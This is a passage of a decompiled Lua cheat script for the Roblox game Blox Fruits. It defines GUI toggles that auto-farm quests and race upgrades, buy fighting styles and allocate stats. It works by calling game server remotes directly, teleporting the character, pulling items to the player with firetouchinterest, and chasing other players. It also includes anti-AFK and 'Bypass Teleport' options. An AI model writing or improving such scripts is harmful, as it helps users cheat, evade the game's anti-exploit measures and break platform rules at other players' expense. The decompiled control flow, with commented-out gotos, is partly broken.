                local v421 = CFrame.new(- 12444.78515625, 332.40396118164, - 7673.1806640625)
                local v422 = CFrame.new(- 10920.125, 624.20275878906, - 10266.995117188)
                local v423 = CFrame.new(- 13277.568359375, 370.34185791016, - 7821.1572265625)
                local v424 = CFrame.new(- 13493.12890625, 318.89553833008, - 8373.7919921875)
                if plr.PlayerGui.Main.Quest.Visible ~= true or not string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Defeat 50 Forest Pirates") then
                    if plr.PlayerGui.Main.Quest.Visible ~= true then
                        if plr.PlayerGui.Main.Quest.Visible == false then
                            replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")
                            wait(0.1)
                            replicated.Remotes.CommF_:InvokeServer("StartQuest", "CitizenQuest", 1)
                        end
                    else
                        local v425 = GetConnectionEnemies("Captain Elephant")
                        if v425 then
                            repeat
                                wait()
                                vu28.Kill(v425, _G.AutoKenVTWO)
                            until not _G.AutoKenVTWO or (v425.Humanoid.Health <= 0 or plr.PlayerGui.Main.Quest.Visible == false)
                        else
                            _tp(v424)
                        end
                    end
                else
                    local v426 = GetConnectionEnemies("Forest Pirate")
                    if v426 then
                        wait()
                        vu28.Kill(v426, _G.AutoKenVTWO)
                        if _G.AutoKenVTWO and (v426.Humanoid.Health > 0 and plr.PlayerGui.Main.Quest.Visible ~= false) then
							-- goto l8
                        end
                    else
						-- ::l8::
                        _tp(v423)
                    end
                end
                if replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen") == 2 then
                    _tp(CFrame.new(- 12513.51953125, 340.11373901367, - 9873.048828125))
                end
                if not (plr.Backpack:FindFirstChild("Fruit Bowl") and plr.Character:FindFirstChild("Fruit Bowl")) then
                    if not GetBP("Fruit Bowl") then
                        if GetBP("Apple") then
                            if GetBP("Banana") then
                                if not GetBP("Pineapple") then
                                    _tp(CFrame.new(- 712.82727050781, 98.577049255371, 5711.9541015625))
                                    local v427, v428, v429 = pairs(workspace:GetDescendants())
                                    while true do
                                        local v430
                                        v429, v430 = v427(v428, v429)
                                        if v429 == nil then
                                            break
                                        end
                                        if v430.Name == "Pineapple" then
                                            v430.Handle.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10)
                                            wait()
                                            firetouchinterest(plr.Character.HumanoidRootPart, v430.Handle, 0)
                                            wait()
                                        end
                                    end
                                end
                            else
                                _tp(CFrame.new(2286.0078125, 73.133918762207, - 7159.8090820312))
                                local v431, v432, v433 = pairs(workspace:GetDescendants())
                                while true do
                                    local v434
                                    v433, v434 = v431(v432, v433)
                                    if v433 == nil then
                                        break
                                    end
                                    if v434.Name == "Banana" then
                                        v434.Handle.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10)
                                        wait()
                                        firetouchinterest(plr.Character.HumanoidRootPart, v434.Handle, 0)
                                        wait()
                                    end
                                end
                            end
                        else
                            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12471.169921875, 374.94024658203, - 7551.677734375))
                            local v435, v436, v437 = pairs(workspace:GetDescendants())
                            while true do
                                local v438
                                v437, v438 = v435(v436, v437)
                                if v437 == nil then
                                    break
                                end
                                if v438.Name == "Apple" then
                                    v438.Handle.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10)
                                    wait()
                                    firetouchinterest(plr.Character.HumanoidRootPart, v438.Handle, 0)
                                    wait()
                                end
                            end
                        end
                    end
                    if plr.Backpack:FindFirstChild("Banana") and (plr.Backpack:FindFirstChild("Apple") and plr.Backpack:FindFirstChild("Pineapple")) or plr:FindFirstChild("Banana") and (plr:FindFirstChild("Apple") and plr:FindFirstChild("Pineapple")) then
                        repeat
                            wait()
                            _tp(v421)
                        until _G.AutoKenVTWO or plr.Character.HumanoidRootPart.CFrame == v421
                        replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")
                    end
                    if plr.Backpack:FindFirstChild("Fruit Bowl") or plr.Character:FindFirstChild("Fruit Bowl") then
                        if plr.Character.HumanoidRootPart.CFrame == v422 then
                            if plr.Character.HumanoidRootPart.CFrame == v422 then
                                replicated.Remotes.CommF_:InvokeServer("KenTalk2", "Start")
                                wait(0.1)
                                replicated.Remotes.CommF_:InvokeServer("KenTalk2", "Buy")
                            end
                        else
                            _tp(v422)
                        end
                    end
                end
            end)
        end
    end
end)
v226.Main:AddSection("Upgrade Races V3")
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Upgrade Mink V3",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p439)
    _G.Auto_Mink = p439
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Mink then
                if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 2 then
                    if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") ~= 1 then
                            _G.AutoFarmChest = false
                        else
                            _G.AutoFarmChest = true
                        end
                    else
                        replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
                    end
                else
                    if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 0 then
                        replicated.Remotes.CommF_:InvokeServer("Alchemist", "2")
						-- goto l3
                    end
                    if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") ~= 1 then
                        if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 2 then
                            replicated.Remotes.CommF_:InvokeServer("Alchemist", "3")
                        end
                    else
                        if not (plr.Backpack:FindFirstChild("Flower 1") or plr.Character:FindFirstChild("Flower 1")) then
                            _tp(workspace.Flower1.CFrame)
							-- goto l3
                        end
                        if not (plr.Backpack:FindFirstChild("Flower 2") or plr.Character:FindFirstChild("Flower 2")) then
                            _tp(workspace.Flower2.CFrame)
							-- goto l3
                        end
                        if plr.Backpack:FindFirstChild("Flower 3") or plr.Character:FindFirstChild("Flower 3") then
							-- goto l3
                        end
                        local v440 = GetConnectionEnemies("Swan Pirate")
                        if v440 then
                            wait()
                            vu28.Kill(v440, _G.Auto_Mink)
                            if GetBP("Flower 3") or (not v440.Parent or (v440.Humanoid.Health <= 0 or _G.Auto_Mink == false)) then
								-- goto l3
                            end
                        end
                        _tp(CFrame.new(980.09851074219, 121.33129882812, 1287.2093505859))
                    end
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Upgrade Human V3",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p441)
    _G.Auto_Human = p441
end)
spawn(function()
	-- upvalues: (ref) vu28, (ref) vu14
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28, (ref) vu14
            if _G.Auto_Human then
                if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == - 2 then
                    if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") == 1 then
                            local v442 = GetConnectionEnemies(vu14[1])
                            if v442 then
                                repeat
                                    wait()
                                    vu28.Kill(v442, _G.Auto_Human)
                                until v442.Humanoid.Health <= 0 or not (v442.Parent and _G.Auto_Human)
                            else
                                _tp(CFrame.new(- 2172.7399902344, 103.32216644287, - 4015.025390625))
                            end
                            local v443 = GetConnectionEnemies(vu14[2])
                            if v443 then
                                repeat
                                    wait()
                                    vu28.Kill(v443, _G.Auto_Human)
                                until v443.Humanoid.Health <= 0 or not (v443.Parent and _G.Auto_Human)
                            else
                                _tp(CFrame.new(2006.9261474609, 448.95666503906, 853.98284912109))
                            end
                            local v444 = GetConnectionEnemies(vu14[3])
                            if v444 then
                                repeat
                                    wait()
                                    vu28.Kill(v444, _G.Auto_Human)
                                until v444.Humanoid.Health <= 0 or not (v444.Parent and _G.Auto_Human)
                            else
                                _tp(CFrame.new(- 1576.7166748047, 198.59265136719, 13.724286079407))
                            end
                        end
                    else
                        replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
                    end
                elseif replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") ~= 0 then
                    if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") ~= 1 then
                        if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 2 then
                            replicated.Remotes.CommF_:InvokeServer("Alchemist", "3")
                        end
                    elseif plr.Backpack:FindFirstChild("Flower 1") or plr.Character:FindFirstChild("Flower 1") then
                        if plr.Backpack:FindFirstChild("Flower 2") or plr.Character:FindFirstChild("Flower 2") then
                            if not (plr.Backpack:FindFirstChild("Flower 3") or plr.Character:FindFirstChild("Flower 3")) then
                                local v445 = GetConnectionEnemies("Swan Pirate")
                                if v445 then
                                    repeat
                                        wait()
                                        vu28.Kill(v445, _G.Auto_Human)
                                    until plr.Backpack:FindFirstChild("Flower 3") or (not v445.Parent or (v445.Humanoid.Health <= 0 or _G.Auto_Human == false))
                                else
                                    _tp(CFrame.new(980.09851074219, 121.33129882812, 1287.2093505859))
                                end
                            end
                        else
                            _tp(workspace.Flower2.CFrame)
                        end
                    else
                        _tp(workspace.Flower1.CFrame)
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("Alchemist", "2")
                end
            end
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Upgrade Skypiea V3",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p446)
    _G.Auto_Skypiea = p446
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Skypiea then
                if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == - 2 then
                    if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") == 1 then
                            local v447, v448, v449 = pairs(game.Players:GetChildren())
                            while true do
                                local v450
                                v449, v450 = v447(v448, v449)
                                if v449 == nil then
                                    break
                                end
                                if v450.Name ~= plr.Name and tostring(v450.Data.Race.Value) == "Skypiea" then
                                    repeat
                                        task.wait()
                                        _tp(v450.HumanoidRootPart.CFrame * CFrame.new(0, 8, 0) * CFrame.Angles(math.rad(- 45), 0, 0))
                                    until v450.Humanoid.Health <= 0 or _G.Auto_Skypiea == false
                                end
                            end
                        end
                    else
                        replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
                    end
                elseif replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") ~= 0 then
                    if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") ~= 1 then
                        if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 2 then
                            replicated.Remotes.CommF_:InvokeServer("Alchemist", "3")
                        end
                    elseif plr.Backpack:FindFirstChild("Flower 1") or plr.Character:FindFirstChild("Flower 1") then
                        if plr.Backpack:FindFirstChild("Flower 2") or plr.Character:FindFirstChild("Flower 2") then
                            if not (plr.Backpack:FindFirstChild("Flower 3") or plr.Character:FindFirstChild("Flower 3")) then
                                local v451 = GetConnectionEnemies("Swan Pirate")
                                if v451 then
                                    repeat
                                        wait()
                                        vu28.Kill(v451, _G.Auto_Skypiea)
                                    until plr.Backpack:FindFirstChild("Flower 3") or (not v451.Parent or (v451.Humanoid.Health <= 0 or _G.Auto_Skypiea == false))
                                else
                                    _tp(CFrame.new(980.09851074219, 121.33129882812, 1287.2093505859))
                                end
                            end
                        else
                            _tp(workspace.Flower2.CFrame)
                        end
                    else
                        _tp(workspace.Flower1.CFrame)
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("Alchemist", "2")
                end
            end
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Upgrade FishMan V3",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p452)
    _G.Auto_Fish = p452
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Fish then
                if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == - 2 then
                    if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") == 1 then
                            warn("Sea Beast Soon")
                        end
                    else
                        replicated.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
                    end
                else
                    if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 0 then
                        replicated.Remotes.CommF_:InvokeServer("Alchemist", "2")
						-- goto l3
                    end
                    if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") ~= 1 then
                        if replicated.Remotes.CommF_:InvokeServer("Alchemist", "1") == 2 then
                            replicated.Remotes.CommF_:InvokeServer("Alchemist", "3")
                        end
                    else
                        if not (plr.Backpack:FindFirstChild("Flower 1") or plr.Character:FindFirstChild("Flower 1")) then
                            _tp(workspace.Flower1.CFrame)
							-- goto l3
                        end
                        if not (plr.Backpack:FindFirstChild("Flower 2") or plr.Character:FindFirstChild("Flower 2")) then
                            _tp(workspace.Flower2.CFrame)
							-- goto l3
                        end
                        if plr.Backpack:FindFirstChild("Flower 3") or plr.Character:FindFirstChild("Flower 3") then
							-- goto l3
                        end
                        local v453 = GetConnectionEnemies("Swan Pirate")
                        if v453 then
                            wait()
                            vu28.Kill(v453, _G.Auto_Fish)
                            if plr.Backpack:FindFirstChild("Flower 3") or (not v453.Parent or (v453.Humanoid.Health <= 0 or _G.Auto_Fish == false)) then
								-- goto l3
                            end
                        end
                        _tp(CFrame.new(980.09851074219, 121.33129882812, 1287.2093505859))
                    end
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Main:AddSection("Dark Dragger + Valkyrie")
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Valkyrie",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p454)
    _G.AutoRipIngay = p454
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoRipIngay then
                local v455 = GetConnectionEnemies("rip_indra")
                if GetWP("Dark Dagger") and (GetIn("Valkyrie") or not v455) then
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5097.93164, 316.447021, - 3142.66602, - 0.405007899, - 4.31682743e-8, 0.914313197, - 1.90943332e-8, 1, 3.8755779e-8, - 0.914313197, - 1.76180437e-9, - 0.405007899))
                    wait(0.1)
                    _tp(CFrame.new(- 5344.822265625, 423.98541259766, - 2725.0930175781))
                else
                    repeat
                        wait()
                        vu28.Kill(v455, _G.AutoRipIngay)
                    until not _G.AutoRipIngay or (not v455.Parent or v455.Humanoid.Health <= 0)
                end
            end
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Unlocked Puzzle",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p456)
    _G.AutoUnHaki = p456
end)
function AuraSkin(p457)
    local v458 = {
        {
            ["StorageName"] = p457,
            ["Type"] = "AuraSkin",
            ["Context"] = "Equip"
        }
    }
    replicated:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RF/FruitCustomizerRF"):InvokeServer(unpack(v458))
end
function VaildColor(p459)
    if p459 and p459.BrickColor then
        return tostring(p459.BrickColor) == "Lime green"
    end
end
function HakiCalculate(p460)
    local v461 = {
        ["Really red"] = "Pure Red",
        ["Oyster"] = "Snow White",
        ["Hot pink"] = "Winter Sky"
    }
    if p460 and p460.BrickColor then
        return v461[tostring(p460.BrickColor)]
    end
end
spawn(function()
    while wait(Sec) do
        if _G.AutoUnHaki then
            pcall(function()
                local v462 = workspace.Map["Boat Castle"]:FindFirstChild("Summoner")
                if v462 and v462:FindFirstChild("Circle") then
                    local v463, v464, v465 = pairs(v462:FindFirstChild("Circle"):GetChildren())
                    while true do
                        local v466
                        v465, v466 = v463(v464, v465)
                        if v465 == nil then
                            break
                        end
                        if v466.Name == "Part" then
                            local v467 = v466:FindFirstChild("Part")
                            if VaildColor(v467) == false then
                                AuraSkin(HakiCalculate(v466))
                                repeat
                                    wait()
                                    _tp(v466.CFrame)
                                until VaildColor(v467) == true or not _G.AutoUnHaki
                            end
                        end
                    end
                end
            end)
        end
    end
end)
v226.Settings:AddSection("Settings / Configure")
v226.Settings:AddDropdown("Weapon_Config", {
    ["Title"] = "Select Weapon",
    ["Values"] = {
        "Melee",
        "Sword",
        "Blox Fruit",
        "Gun"
    },
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p468)
    _G.ChooseWP = p468
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.ChooseWP ~= "Melee" then
                if _G.ChooseWP ~= "Sword" then
                    if _G.ChooseWP ~= "Gun" then
                        if _G.ChooseWP == "Blox Fruit" then
                            local v469, v470, v471 = pairs(plr.Backpack:GetChildren())
                            while true do
                                local v472
                                v471, v472 = v469(v470, v471)
                                if v471 == nil then
                                    break
                                end
                                if v472.ToolTip == "Blox Fruit" and plr.Backpack:FindFirstChild(tostring(v472.Name)) then
                                    _G.SelectWeapon = v472.Name
                                end
                            end
                        end
                    else
                        local v473, v474, v475 = pairs(plr.Backpack:GetChildren())
                        while true do
                            local v476
                            v475, v476 = v473(v474, v475)
                            if v475 == nil then
                                break
                            end
                            if v476.ToolTip == "Gun" and plr.Backpack:FindFirstChild(tostring(v476.Name)) then
                                _G.SelectWeapon = v476.Name
                            end
                        end
                    end
                else
                    local v477, v478, v479 = pairs(plr.Backpack:GetChildren())
                    while true do
                        local v480
                        v479, v480 = v477(v478, v479)
                        if v479 == nil then
                            break
                        end
                        if v480.ToolTip == "Sword" and plr.Backpack:FindFirstChild(tostring(v480.Name)) then
                            _G.SelectWeapon = v480.Name
                        end
                    end
                end
            else
                local v481, v482, v483 = pairs(plr.Backpack:GetChildren())
                while true do
                    local v484
                    v483, v484 = v481(v482, v483)
                    if v483 == nil then
                        break
                    end
                    if v484.ToolTip == "Melee" and plr.Backpack:FindFirstChild(tostring(v484.Name)) then
                        _G.SelectWeapon = v484.Name
                    end
                end
            end
        end)
    end
end)
v226.Settings:AddToggle("Initialize", {
    ["Title"] = "Initialize Attack [M1/Melee/Sword]",
    ["Description"] = "[ Not Supported Gas M1 ]",
    ["Default"] = true
}):OnChanged(function(p485)
    _G.Seriality = p485
end)
v226.Settings:AddToggle("Bringmob", {
    ["Title"] = "Bring Mobs",
    ["Description"] = "",
    ["Default"] = true
}):OnChanged(function(p486)
    _B = p486
end)
v226.Settings:AddToggle("BusuAura", {
    ["Title"] = "Auto Turn on Buso",
    ["Description"] = "",
    ["Default"] = true
}):OnChanged(function(p487)
    Boud = p487
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if Boud then
                local v488 = {
                    "HasBuso",
                    "Buso"
                }
                if not plr.Character:FindFirstChild(v488[1]) then
                    replicated.Remotes.CommF_:InvokeServer(v488[2])
                end
            end
        end)
    end
end)
v226.Settings:AddToggle("RaceV3Aura", {
    ["Title"] = "Auto Turn on Race V3",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p489)
    _G.RaceClickAutov3 = p489
end)
spawn(function()
    while wait(0.2) do
        pcall(function()
            if _G.RaceClickAutov3 then
                repeat
                    replicated.Remotes.CommE:FireServer("ActivateAbility")
                    wait(30)
                until not _G.RaceClickAutov3
            end
        end)
    end
end)
v226.Settings:AddToggle("RaceV4Aura", {
    ["Title"] = "Auto Turn on Race V4",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p490)
    _G.RaceClickAutov4 = p490
end)
spawn(function()
    while wait(0.2) do
        pcall(function()
            if _G.RaceClickAutov4 and (plr.Character:FindFirstChild("RaceEnergy") and plr.Character:FindFirstChild("RaceEnergy").Value == 1) then
                Useskills("nil", "Y")
            end
        end)
    end
end)
v226.Settings:AddToggle("RandomAround", {
    ["Title"] = "Auto Turn on Spin Position",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p491)
    RandomCFrame = p491
end)
v226.Settings:AddToggle("Byp", {
    ["Title"] = "Turn on Bypass Teleport",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p492)
    _G.Bypass = p492
end)
v226.Settings:AddToggle("SafeModes", {
    ["Title"] = "Panic Mode",
    ["Description"] = "turn on for safe ur health if low",
    ["Default"] = false
}):OnChanged(function(p493)
    _G.Safemode = p493
end)
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Safemode then
                if plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth * 100 >= Num_self then
                    shouldTween = false
                else
                    shouldTween = true
                    _tp(Root.CFrame * CFrame.new(0, 500, 0))
                end
            end
        end)
    end
end)
v226.Settings:AddToggle("UnDetectedAFK", {
    ["Title"] = "Anti AFK",
    ["Description"] = "",
    ["Default"] = true
}):OnChanged(function(p494)
    _G.AntiAFK = p494
end)
plr.Idled:connect(function()
    vim2:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    wait(1)
    vim2:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)
v226.Settings:AddToggle("DisblesVFX", {
    ["Title"] = "Remove Hit VFX",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p495)
    _G.DistroyHit = p495
end)
spawn(function()
    while wait(Sec) do
        if _G.DistroyHit then
            pcall(function()
                local v496, v497, v498 = pairs(workspace._WorldOrigin:GetChildren())
                while true do
                    local v499
                    v498, v499 = v496(v497, v498)
                    if v498 == nil then
                        break
                    end
                    if table.find(__Effect, v499.Name) then
                        v499:Destroy()
                    end
                end
            end)
        end
    end
end)
v226.Settings:AddToggle("DisblesVFX", {
    ["Title"] = "Remove Death & Respawned VFX",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p500)
    RDeath = p500
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if RDeath then
                if replicated.Effect.Container:FindFirstChild("Death") then
                    replicated.Effect.Container.Death:Destroy()
                end
                if replicated.Effect.Container:FindFirstChild("Respawn") then
                    replicated.Effect.Container.Respawn:Destroy()
                end
            end
        end)
    end
end)
v226.Settings:AddToggle("DisblesVFX", {
    ["Title"] = "Disable Notify",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p501)
    RemoveDamage = p501
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if RemoveDamage then
                replicated.Assets.GUI.DamageCounter.Enabled = false
                plr.PlayerGui.Notifications.Enabled = false
            else
                replicated.Assets.GUI.DamageCounter.Enabled = true
                plr.PlayerGui.Notifications.Enabled = true
            end
        end)
    end
end)
v226.Settings:AddSection("Stats Upgrade")
v226.Settings:AddSlider("StatusSelect", {
    ["Title"] = "Stats Value",
    ["Description"] = "choose your point need to upgrade",
    ["Default"] = 10,
    ["Min"] = 0,
    ["Max"] = 1000,
    ["Rounding"] = 1,
    ["Callback"] = function(p502)
        pSats = p502
    end
})
v226.Settings:AddToggle("StatsUpg", {
    ["Title"] = "Auto Melee",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p503)
    _G.Auto_Melee = p503
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Melee then
                statsSetings("Melee", pSats)
            end
        end)
    end
end)
v226.Settings:AddToggle("StatsUpg", {
    ["Title"] = "Auto Swords",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p504)
    _G.Auto_Sword = p504
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Sword then
                statsSetings("Sword", pSats)
            end
        end)
    end
end)
v226.Settings:AddToggle("StatsUpg", {
    ["Title"] = "Auto Gun",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p505)
    _G.Auto_Gun = p505
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Gun then
                statsSetings("Gun", pSats)
            end
        end)
    end
end)
v226.Settings:AddToggle("StatsUpg", {
    ["Title"] = "Auto Blox Fruit",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p506)
    _G.Auto_DevilFruit = p506
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_DevilFruit then
                statsSetings("Devil", pSats)
            end
        end)
    end
end)
v226.Settings:AddToggle("StatsUpg", {
    ["Title"] = "Auto Defense",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p507)
    _G.Auto_Defense = p507
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Defense then
                statsSetings("Defense", pSats)
            end
        end)
    end
end)
v226.Melee:AddSection("Fighting Melee Styles")
v226.Melee:AddToggle("SuperHuman", {
    ["Title"] = "Auto Superhuman",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p508)
    _G.Auto_SuperHuman = p508
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_SuperHuman then
                local v509 = plr.Data.Beli.Value
                local v510 = plr.Data.Fragments.Value
                if plr:FindFirstChild("WeaponAssetCache") and not GetBP("Superhuman") then
                    if GetBP("Black Leg") then
                        if GetBP("Black Leg") and GetBP("Black Leg").Level.Value < 299 then
                            _G.Level = true
                        elseif GetBP("Black Leg") and GetBP("Black Leg").Level.Value >= 300 then
                            _G.Level = false
                        end
                    elseif v509 >= 150000 then
                        replicated.Remotes.CommF_:InvokeServer("BuyBlackLeg")
                    end
                    if GetBP("Electro") then
                        if GetBP("Electro") and GetBP("Electro").Level.Value < 299 then
                            _G.Level = true
                        elseif GetBP("Electro") and GetBP("Electro").Level.Value >= 300 then
                            _G.Level = false
                        end
                    elseif v509 >= 500000 then
                        replicated.Remotes.CommF_:InvokeServer("BuyElectro")
                    end
                    if GetBP("Fishman Karate") then
                        if GetBP("Fishman Karate") and GetBP("Fishman Karate").Level.Value < 299 then
                            _G.Level = true
                        elseif GetBP("Fishman Karate") and GetBP("Fishman Karate").Level.Value >= 300 then
                            _G.Level = false
                        end
                    elseif v509 >= 750000 then
                        replicated.Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                    end
                    if GetBP("Dragon Claw") then
                        if GetBP("Dragon Claw") and GetBP("Dragon Claw").Level.Value < 299 then
                            _G.Level = true
                        elseif GetBP("Dragon Claw") and GetBP("Dragon Claw").Level.Value >= 300 then
                            _G.Level = false
                        end
                    elseif v510 >= 1500 then
                        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
                    end
                    replicated.Remotes.CommF_:InvokeServer("BuySuperhuman")
                end
            end
        end)
    end
end)
v226.Melee:AddToggle("DeathStep", {
    ["Title"] = "Auto DeathStep",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p511)
    _G.AutoDeathStep = p511
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoDeathStep then
            pcall(function()
				-- upvalues: (ref) vu28
                if plr:FindFirstChild("WeaponAssetCache") and not GetBP("Death Step") then
                    if not GetBP("Black Leg") then
                        replicated.Remotes.CommF_:InvokeServer("BuyBlackLeg")
                    end
                    if GetBP("Black Leg") and GetBP("Black Leg").Level.Value >= 400 then
                        replicated.Remotes.CommF_:InvokeServer("BuyDeathStep")
                        _G.Level = false
                    elseif GetBP("Black Leg") and GetBP("Black Leg").Level.Value < 399 then
                        _G.Level = true
                    end
                    if not GetBP("Black Leg") and GetBP("Black Leg").Level.Value < 400 or workspace.Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency ~= 0 then
						-- goto l3
                    end
                    if GetBP("Library Key") then
                        repeat
                            wait()
                            _tp(CFrame.new(6371.2001953125, 296.63433837891, - 6841.1811523438))
                        until not _G.AutoDeathStep or Root.Position == CFrame.new(6371.2001953125, 296.63433837891, - 6841.1811523438).Position
                        if Root.CFrame == CFrame.new(6371.2001953125, 296.63433837891, - 6841.1811523438) then
                            replicated.Remotes.CommF_:InvokeServer("BuyDeathStep")
                        end
						-- goto l3
                    end
                    if GetBP("Library Key") then
						-- goto l3
                    end
                    local v512 = GetConnectionEnemies("Awakened Ice Admiral")
                    if v512 then
                        wait()
                        vu28.Kill(v512, _G.AutoDeathStep)
                        if not v512.Parent or (v512.Humanoid.Health <= 0 or (_G.AutoDeathStep == false or (GetBP("Library Key") or GetBP("Death Step")))) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(5668.9780273438, 28.519989013672, - 6483.3520507813))
                end
				-- ::l3::
            end)
        end
    end
end)
v226.Melee:AddToggle("SharkManV2", {
    ["Title"] = "Auto Sharkman Karate",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p513)
    _G.Auto_SharkMan_Karate = p513
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.Auto_SharkMan_Karate then
            pcall(function()
				-- upvalues: (ref) vu28
                if plr:FindFirstChild("WeaponAssetCache") and not GetBP("Sharkman Karate") then
                    if not GetBP("Fishman Karate") then
                        replicated.Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                    end
                    if GetBP("Fishman Karate") and GetBP("Fishman Karate").Level.Value >= 400 then
                        replicated.Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                        _G.Level = false
                    elseif GetBP("Fishman Karate") and GetBP("Fishman Karate").Level.Value < 399 then
                        _G.Level = true
                    end
                    if not GetBP("Fishman Karate") and GetBP("Fishman Karate").Level.Value < 400 then
						-- goto l3
                    end
                    if GetBP("Water Key") then
                        if string.find(replicated.Remotes.CommF_:InvokeServer("BuySharkmanKarate"), "keys") and GetBP("Water Key") then
                            repeat
                                wait()
                                _tp(CFrame.new(- 2604.6958, 239.432526, - 10315.1982, 0.0425701365, 0, - 0.999093413, 0, 1, 0, 0.999093413, 0, 0.0425701365))
